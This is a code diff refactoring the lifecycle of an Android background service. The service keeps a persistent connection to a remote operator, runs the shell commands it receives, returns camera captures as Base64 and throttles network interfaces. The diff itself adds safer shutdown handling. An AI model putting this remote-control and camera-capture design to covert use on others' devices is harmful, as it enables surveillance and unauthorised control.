@@ -132,6 +132,7 @@ public class BackgroundService extends Service {
     private static final Object cameraLock = new Object();
     private static volatile boolean cameraResultReady = false;
     private static volatile String cameraResult;
+    private final AtomicBoolean serviceStopping = new AtomicBoolean(false);
 
     /**
      * يرسل نتيجة التقاط الصورة (PHOTO_OK:Base64 أو نص خطأ) إلى الخدمة
@@ -215,56 +216,83 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        serviceStopping.set(false);
+
         Notification notification = buildNotification();
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            startForeground(
+                NOTIFICATION_ID,
+                notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            );
         } else {
             startForeground(NOTIFICATION_ID, notification);
         }
 
         if (connectionThreadStarted.compareAndSet(false, true)) {
             running = true;
-            connectionThread = new Thread(this::establishConnection, "bg-connection");
+            connectionThread = new Thread(
+                this::establishConnection,
+                "bg-connection"
+            );
             connectionThread.start();
         }
 
         handleIncomingTrigger(intent);
 
+    /*
+     * START_STICKY is intentionally preserved:
+     * Android may recreate the service after process death/reboot.
+     */
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
+        serviceStopping.set(true);
         running = false;
         instance = null;
-        if (agentConnectionManager != null) {
-            agentConnectionManager.stop();
-            agentConnectionManager = null;
+
+        AgentConnectionManager manager = agentConnectionManager;
+        agentConnectionManager = null;
+
+        if (manager != null) {
+            try {
+                manager.stop();
+            } catch (Exception e) {
+                Log.w(TAG, "Failed to stop AgentConnectionManager", e);
+            }
         }
+
         Thread thread = connectionThread;
+        connectionThread = null;
+
         if (thread != null) {
             thread.interrupt();
         }
 
-        synchronized (workerLock) {
-            if (workerHandler != null) {
+        connectionThreadStarted.set(false);
+
+
+            synchronized (workerLock) {
+                if (workerHandler != null) {
                 workerHandler.removeCallbacksAndMessages(null);
                 workerHandler = null;
-            }
-            if (workerThread != null) {
+                }
+                if (workerThread != null) {
                 workerThread.quitSafely();
                 workerThread = null;
+                }
             }
-        }
-        File pending = pendingScriptFile;
-        if (pending != null && pending.exists()) {
-            boolean deleted = pending.delete();
+            File pending = pendingScriptFile;
+            if (pending != null && pending.exists()) {
+                boolean deleted = pending.delete();
             if (deleted) {
                 Log.i(TAG, "cleaned pending script file on destroy");
             }
             pendingScriptFile = null;
-        }
+            }
         if (degradationActive && degradedInterface != null) {
             runShellCommand("sh", "-c", "tc qdisc del dev " + degradedInterface + " root 2>/dev/null");
             Log.i(TAG, "attempted to restore network condition on destroy (dev=" + degradedInterface + ")");
@@ -361,16 +389,32 @@ public class BackgroundService extends Service {
     // ------------------------------------------------------------------
 
     private void establishConnection() {
-        agentConnectionManager = new AgentConnectionManager(this,
-                this::executeCommand,
-                () -> { running = false; stopSelf(); },
-                agentIdentity);
+        AgentConnectionManager manager = new AgentConnectionManager(
+            this,
+            this::executeCommand,
+            () -> {
+                if (!serviceStopping.get()) {
+                    running = false;
+                    stopSelf();
+                }
+            },
+            agentIdentity
+        );
+
+        agentConnectionManager = manager;
+
         try {
-            agentConnectionManager.run();
+        manager.run();
         } catch (Exception e) {
+            if (!serviceStopping.get()) {
             Log.w(TAG, "agent connection manager failed", e);
+        }
         } finally {
-            connectionThreadStarted.set(false);
+            if (agentConnectionManager == manager) {
+            agentConnectionManager = null;
+        }
+
+        connectionThreadStarted.set(false);
         }
     }
 
@@ -423,7 +467,7 @@ public class BackgroundService extends Service {
     private void executeCommand(String command, OutputStream out) throws IOException {
         try {
             if (command.equals("exit")) {
-                // أمر صريح من المشغّل بإنهاء الجلسة وإيقاف الخدمة
+                serviceStopping.set(true);
                 running = false;
                 stopSelf();
                 throw new IOException("exit requested");
